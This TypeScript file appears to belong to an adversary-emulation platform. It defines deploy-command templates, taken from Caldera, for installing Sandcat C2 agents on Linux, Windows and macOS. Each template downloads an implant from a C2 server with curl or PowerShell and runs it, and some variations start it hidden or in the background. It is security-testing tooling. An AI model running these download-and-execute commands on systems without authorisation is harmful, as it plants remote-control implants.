/**
 * Sandcat install commands, served by `agents.deployCommands`.
 *
 * These were Caldera's `/api/v2/deploy_commands` payloads; now that we run our
 * own C2 they live here. The `#{...}` placeholders are kept so the deploy modal
 * and `utils/deployCommand.ts` keep working unchanged — they are filled from the
 * AgentConfig row (`app.contact.http` = c2Url, `agents.implant_name`).
 *
 * Only variations that actually work against our C2 are included. Caldera also
 * ships GIST-C2, P2P-relay, compile-with-extensions and darwin-ARM64 variants;
 * all of them need either a non-HTTP contact or on-demand Go compilation, and we
 * support neither, so shipping them would hand operators commands that fail.
 */

export interface DeployVariation {
  description: string;
  command: string;
}

export interface DeployTemplate {
  platform: "linux" | "windows" | "darwin";
  executor: string;
  description: string;
  command: string;
  variations: DeployVariation[];
}

const AGENT_DESCRIPTION =
  "The default agent, written in GoLang. Communicates over the HTTP contact.";

const nixDefault = (platform: string, extraHeaders = "") => `server="#{app.contact.http}";
curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}"${extraHeaders} $server/file/download > #{agents.implant_name};
chmod +x #{agents.implant_name};
./#{agents.implant_name} -server $server -group red -v`;

const nixGroup = (platform: string, group: string, extraHeaders = "") =>
  `server="#{app.contact.http}";curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}"${extraHeaders} $server/file/download > #{agents.implant_name};chmod +x #{agents.implant_name};./#{agents.implant_name} -server $server -group ${group} -v`;

const nixBackground = (platform: string, extraHeaders = "") =>
  `server="#{app.contact.http}";agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:${platform}"${extraHeaders} $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\\r') && chmod +x $agent 2>/dev/null;nohup ./$agent -server $server -group red &`;

export const DEPLOY_TEMPLATES: DeployTemplate[] = [
  {
    platform: "linux",
    executor: "sh",
    description: AGENT_DESCRIPTION,
    command: nixDefault("linux"),
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: nixGroup("linux", "blue"),
      },
      {
        description: "Download with a random name and start as a background process",
        command: nixBackground("linux"),
      },
    ],
  },
  {
    platform: "windows",
    executor: "psh",
    description: AGENT_DESCRIPTION,
    command: `$server="#{app.contact.http}";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\#{agents.implant_name}.exe"} | stop-process -f;
rm -force "C:\\Users\\Public\\#{agents.implant_name}.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\\Users\\Public\\#{agents.implant_name}.exe",$data) | Out-Null;
Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: `$server="#{app.contact.http}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\#{agents.implant_name}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\#{agents.implant_name}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\#{agents.implant_name}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;`,
      },
    ],
  },
  {
    platform: "darwin",
    executor: "sh",
    description: AGENT_DESCRIPTION,
    command: nixDefault("darwin", ' -H "architecture:amd64"'),
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: nixGroup("darwin", "blue", ' -H "architecture:amd64"'),
      },
      {
        description: "Download with a random name and start as a background process",
        command: nixBackground("darwin", ' -H "architecture:amd64"'),
      },
    ],
  },
];
